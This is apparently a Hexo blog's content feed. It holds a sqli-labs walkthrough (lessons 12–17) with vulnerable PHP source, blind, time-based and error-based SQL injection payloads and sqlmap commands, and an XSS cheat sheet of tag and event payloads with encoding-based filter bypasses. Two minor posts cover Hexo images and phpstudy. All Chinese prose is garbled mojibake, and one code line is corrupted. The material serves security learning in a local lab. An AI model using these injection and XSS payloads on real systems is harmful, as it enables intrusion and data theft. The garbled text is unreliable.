class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å›æ˜¾ï¼Œä½¿ç”¨å¸ƒå°”ç›²æ³¨</p>
<p><code>uname=admin&#39;) and left(database(),1)&gt;&#39;n&#39; # &amp; passwd=admin</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs </code></p>
<h3 id="14POSTæ—¶é—´ç›²æ³¨"><a href="#14POSTæ—¶é—´ç›²æ³¨" class="headerlink" title="14POSTæ—¶é—´ç›²æ³¨"></a>14POSTæ—¶é—´ç›²æ³¨</h3><p><code>&quot;</code>é—­åˆ å’Œ13é¢˜ä¸€æ ·</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-14/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<h3 id="15-POSTæ—¶é—´-å¸ƒå°”ç›²æ³¨"><a href="#15-POSTæ—¶é—´-å¸ƒå°”ç›²æ³¨" class="headerlink" title="15 POSTæ—¶é—´/å¸ƒå°”ç›²æ³¨"></a>15 POSTæ—¶é—´/å¸ƒå°”ç›²æ³¨</h3><p><code>uname=admin&#39; and sleep(5) #&amp; passwd=admin</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<br>

<h3 id="16POSTæ—¶é—´ç›²æ³¨"><a href="#16POSTæ—¶é—´ç›²æ³¨" class="headerlink" title="16POSTæ—¶é—´ç›²æ³¨"></a>16POSTæ—¶é—´ç›²æ³¨</h3><p><code>uname=admin&quot;) and sleep(5) #&amp; passwd=admin</code></p>
<p>SQLmap<br><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-16/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<p><code>python sqlmap.py -r 1.txt --batch --level 3 --dbs</code></p>
<h3 id="17POSTæ˜¾é”™æ³¨å…¥"><a href="#17POSTæ˜¾é”™æ³¨å…¥" class="headerlink" title="17POSTæ˜¾é”™æ³¨å…¥"></a>17POSTæ˜¾é”™æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;New Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">		mysql_query(<span class="variable">$update</span>);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> (mysql_error())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot; You password has been successfully updated &quot; ;		</span></span><br><span class="line">]			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åªå¯¹<code>username</code>ä½¿ç”¨<code>check_input()</code>å‡½æ•°è¿›è¡Œè¿‡æ»¤Â·,<code>check_input()</code>ä½œç”¨æ˜¯æˆªå–15ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœå¼€å¯äº†GPC,å°±å»æ‰åæ–œæ ï¼Œåœ¨åˆ¤æ–­æ˜¯å¦æ˜¯åè¿›åˆ¶ï¼Œå¦‚æœä¸æ˜¯åè¿›åˆ¶ï¼Œ å°±è½¬è¯‘æ‰ç‰¹æ®Šå­—ç¬¦</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">stripslashes() å‡½æ•°åˆ é™¤ç”± addslashes() å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string() å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</span><br><span class="line">ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š</span><br><span class="line">    \x00</span><br><span class="line">    \n</span><br><span class="line">    \r</span><br><span class="line">    \</span><br><span class="line">    &#x27;</span><br><span class="line">    &quot;</span><br><span class="line">    \x1a</span><br></pre></td></tr></table></figure>

<p><code>uname=admin&amp;passwd=123456&#39; #&amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ &amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -r 1.txt --batch --dbs</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoæ–‡ç« æ’å…¥å›¾ç‰‡</title>
    <url>/posts/7ecd88c4/</url>
    <content><![CDATA[<h3 id="æœ¬åœ°å¼•ç”¨-é‡‡ç”¨ç›¸å¯¹è·¯å¾„"><a href="#æœ¬åœ°å¼•ç”¨-é‡‡ç”¨ç›¸å¯¹è·¯å¾„" class="headerlink" title="æœ¬åœ°å¼•ç”¨(é‡‡ç”¨ç›¸å¯¹è·¯å¾„)"></a>æœ¬åœ°å¼•ç”¨(é‡‡ç”¨ç›¸å¯¹è·¯å¾„)</h3><p>åœ¨ <code>config.yml</code>æ–‡ä»¶ä¸­é…ç½®ï¼Œpost_asset_folderè®¾ä¸ºtrueï¼Œå½“å†æ¬¡æ–°å»ºæ–‡ç« æ—¶ï¼Œä¼šåœ¨source/_postä¸­ç”Ÿäº§å’Œæ–‡ç« åŒåçš„æ–‡ä»¶å¤¹ï¼ŒæŠŠéœ€è¦çš„å›¾ç‰‡èµ„æºæ”¾å…¥è¯¥æ–‡ä»¶å¤¹ï¼Œå°±å¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„æ¥å¼•ç”¨å›¾ç‰‡.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudyè®¿é—®localhostä¸å‡ºç°ç›®å½•çš„é—®é¢˜</title>
    <url>/posts/2704909e/</url>
    <content><![CDATA[<h4 id="æ–°ç‰ˆphpstudyä¸­ï¼Œéœ€è¦åœ¨æ‰“å¼€-â€œç½‘ç«™â€â€“-gt-â€ç®¡ç†â€â€“-gt-â€ä¿®æ”¹â€â€“-gt-â€é«˜çº§é…ç½®â€ä¸‹æ‰“å¼€â€™ç›®å½•ç´¢å¼•â€™"><a href="#æ–°ç‰ˆphpstudyä¸­ï¼Œéœ€è¦åœ¨æ‰“å¼€-â€œç½‘ç«™â€â€“-gt-â€ç®¡ç†â€â€“-gt-â€ä¿®æ”¹â€â€“-gt-â€é«˜çº§é…ç½®â€ä¸‹æ‰“å¼€â€™ç›®å½•ç´¢å¼•â€™" class="headerlink" title="æ–°ç‰ˆphpstudyä¸­ï¼Œéœ€è¦åœ¨æ‰“å¼€ â€œç½‘ç«™â€â€“&gt;â€ç®¡ç†â€â€“&gt;â€ä¿®æ”¹â€â€“&gt;â€é«˜çº§é…ç½®â€ä¸‹æ‰“å¼€â€™ç›®å½•ç´¢å¼•â€™"></a>æ–°ç‰ˆphpstudyä¸­ï¼Œéœ€è¦åœ¨æ‰“å¼€ â€œç½‘ç«™â€â€“&gt;â€ç®¡ç†â€â€“&gt;â€ä¿®æ”¹â€â€“&gt;â€é«˜çº§é…ç½®â€ä¸‹æ‰“å¼€â€™ç›®å½•ç´¢å¼•â€™</h4><p><img src="/posts/2704909e/phpstudy1.png"></p>
]]></content>
      <categories>
        <category>phpstudy</category>
      </categories>
      <tags>
        <tag>phpstudy</tag>
      </tags>
  </entry>
  <entry>
    <title>XSSæ€»ç»“</title>
    <url>/posts/9f0502f1/</url>
    <content><![CDATA[<h2 id="XSSåˆ†ç±»"><a href="#XSSåˆ†ç±»" class="headerlink" title="XSSåˆ†ç±»"></a>XSSåˆ†ç±»</h2><h3 id="åå°„å‹"><a href="#åå°„å‹" class="headerlink" title="åå°„å‹"></a>åå°„å‹</h3><p>æŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®ä»æœåŠ¡å™¨åå°„ç»™ç”¨æˆ·æµè§ˆå™¨ï¼Œè¦ç²¾å¿ƒæ„é€ payload</p>
<p>æ”»å‡»è€…é€šè¿‡ç”µå­é‚®ä»¶ç­‰æ–¹å¼ï¼Œè¯±ä½¿ç”¨æˆ·å»è®¿é—®ä¸€ä¸ªåŒ…å«æ¶æ„xssä»£ç çš„ URLï¼Œå½“å—å®³è€…ç‚¹å‡»è¿™äº›ä¸“é—¨è®¾è®¡çš„é“¾æ¥çš„æ—¶å€™ï¼Œæ¶æ„ä»£ç ä¼šç›´æ¥åœ¨å—å®³è€…ä¸»æœºä¸Šçš„æµè§ˆå™¨æ‰§è¡Œã€‚</p>
<p>æ­¤ç±» XSS é€šå¸¸å‡ºç°åœ¨ç½‘ç«™çš„æœç´¢æ ã€ç”¨æˆ·ç™»å½•å£ç­‰åœ°æ–¹ï¼Œå¸¸ç”¨æ¥çªƒå–å®¢æˆ·ç«¯ Cookies æˆ–è¿›è¡Œé’“é±¼æ¬ºéª—ã€‚</p>
<h3 id="å­˜å‚¨å‹"><a href="#å­˜å‚¨å‹" class="headerlink" title="å­˜å‚¨å‹"></a>å­˜å‚¨å‹</h3><p>åˆç§°æŒä¹…å‹XSS,å¨èƒè¦æ¯”åå°„å‹XSSè¦å¤§,å­˜å‚¨åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸­.</p>
<p>ç”¨æˆ·ä¸éœ€è¦ç‚¹å‡»ç‰¹å®šçš„urlå°±å¯ä¸æ‰§è¡Œï¼Œæ”»å‡»è€…äº‹å…ˆæŠŠæ¶æ„ä»£ç ä¸Šä¼ æˆ–å­˜å‚¨åˆ°æœåŠ¡å™¨ä¸­ï¼Œå—å®³è€…åªéœ€ç‚¹å¼€è¿™ä¸ªå«æœ‰æ¶æ„ä»£ç çš„é¡µé¢jå°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨ä¸€äº›ç½‘ä¸Šçš„xsså¹³å°.</p>
<p>æ­¤ç±»XSSå¸¸å‡ºç°åœ¨ç½‘ç«™ç•™è¨€è¯„è®ºç­‰äº¤äº’å¤„.</p>
<br>

<h3 id="DOMå‹"><a href="#DOMå‹" class="headerlink" title="DOMå‹"></a>DOMå‹</h3><p>DOM-Based XSSåŸºäºDOMæ–‡æ¡£å¯¹è±¡çš„ä¸€ç§æ¼æ´ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„åå°„å‹XSS.DOMå‹XSSåŸºäºJSä¸Šï¼Œä¸éœ€è¦ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚</p>
<br>

<h2 id="å¸¸ç”¨æ ‡ç­¾"><a href="#å¸¸ç”¨æ ‡ç­¾" class="headerlink" title="å¸¸ç”¨æ ‡ç­¾"></a>å¸¸ç”¨æ ‡ç­¾</h2><h3 id="lt-a-gt-æ ‡ç­¾"><a href="#lt-a-gt-æ ‡ç­¾" class="headerlink" title="&lt;a&gt;æ ‡ç­¾"></a><code>&lt;a&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-img-gt-æ ‡ç­¾"><a href="#lt-img-gt-æ ‡ç­¾" class="headerlink" title="&lt;img&gt;æ ‡ç­¾"></a><code>&lt;img&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;<span class="attr">alert</span>(&#x27;<span class="attr">xss</span>&#x27;)&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-script-gt-æ ‡ç­¾"><a href="#lt-script-gt-æ ‡ç­¾" class="headerlink" title="&lt;script&gt;æ ‡ç­¾"></a><code>&lt;script&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-form-gt-æ ‡ç­¾"><a href="#lt-form-gt-æ ‡ç­¾" class="headerlink" title="&lt;form&gt;æ ‡ç­¾"></a><code>&lt;form&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>)&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="lt-iframe-gt-æ ‡ç­¾"><a href="#lt-iframe-gt-æ ‡ç­¾" class="headerlink" title="&lt;iframe&gt;æ ‡ç­¾"></a><code>&lt;iframe&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);<span class="attr">height</span>=<span class="string">5width</span>=<span class="string">1000</span> /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;aaa&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;) /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-svg-gt-æ ‡ç­¾"><a href="#lt-svg-gt-æ ‡ç­¾" class="headerlink" title="&lt;svg&gt;æ ‡ç­¾"></a><code>&lt;svg&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="å¸¸ç”¨çš„onäº‹ä»¶"><a href="#å¸¸ç”¨çš„onäº‹ä»¶" class="headerlink" title="å¸¸ç”¨çš„onäº‹ä»¶"></a>å¸¸ç”¨çš„onäº‹ä»¶</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">onchange 	      #HTML å…ƒç´ æ”¹å˜</span><br><span class="line">onclick 	      #ç”¨æˆ·ç‚¹å‡» HTML å…ƒç´ </span><br><span class="line">onmouseover 	  #ç”¨æˆ·åœ¨ä¸€ä¸ªHTMLå…ƒç´ ä¸Šç§»åŠ¨é¼ æ ‡</span><br><span class="line">onmouseout 	    #ç”¨æˆ·ä»ä¸€ä¸ªHTMLå…ƒç´ ä¸Šç§»å¼€é¼ æ ‡</span><br><span class="line">onkeydown 	    #ç”¨æˆ·æŒ‰ä¸‹é”®ç›˜æŒ‰é”®</span><br><span class="line">onload 	        #æµè§ˆå™¨å·²å®Œæˆé¡µé¢çš„åŠ è½½</span><br><span class="line">onerror         #å‘ç”Ÿé”™è¯¯æ—¶æ‰§è¡Œjs</span><br></pre></td></tr></table></figure>

<h2 id="XSSç»•è¿‡"><a href="#XSSç»•è¿‡" class="headerlink" title="XSSç»•è¿‡"></a>XSSç»•è¿‡</h2><h3 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/**/ , /ç¬¦å· ï¼Œ</span><br></pre></td></tr></table></figure>

<h3 id="è¿‡æ»¤å…³é”®å­—"><a href="#è¿‡æ»¤å…³é”®å­—" class="headerlink" title="è¿‡æ»¤å…³é”®å­—"></a>è¿‡æ»¤å…³é”®å­—</h3><br>

<br>

<h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><ul>
<li>HTMLå®ä½“ç¼–ç </li>
</ul>
<p>ä»¥<code>&amp;</code>å¼€å¤´ï¼Œä»¥åˆ†å·ç»“å°¾çš„ï¼Œ</p>
<p>å¦‚<code>&lt;</code>çš„ç¼–ç ä¸º<code>&amp;1t;</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">ä»¥&amp;å¼€å¤´ï¼Œä»¥åˆ†å·ç»“å°¾çš„ï¼Œå¦‚&lt;çš„ç¼–ç ä¸º&amp;1t;</span><br></pre></td></tr></table></figure>

<ul>
<li>URLç¼–ç </li>
</ul>
<p> å¯ä»¥è€ƒè™‘è¿›è¡Œä¸€æ¬¡urlç¼–ç æˆ–è€…äºŒæ¬¡urlç¼–ç </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(1) =&gt; javascript%3Aalert%281%29</span><br><span class="line">alert(&quot;xss&quot;); =&gt; %61%6c%65%72%74%28%22%78%73%73%22%29%3b</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Unicodeç¼–ç </li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">alert(&quot;xss&quot;); =&gt; \u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Asciiç </li>
</ul>
<p><code>var n = String.fromCharCode(65)</code>  è¾“å‡º <code>A</code></p>
<p><code>var n=String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59);</code> </p>
<p>è¾“å‡º <code>alert(&quot;xss&quot;);</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Base64</li>
</ul>
<p>JSä¸­ç”¨æ¥ç¼–ç å’Œè§£ç base64çš„ä¸¤ä¸ªå‡½æ•°</p>
<p><code>abto()</code> base64è§£ç </p>
<p><code>btoa()</code> ç¼–ç ä¸ºbase64</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ImFsZXJ0KCd4c3MnKSI=&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å…«è¿›åˆ¶</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Hex</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> =&gt; 3C7363726970743E616C657274282278737322293B3C2F7363726970743E</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<br>

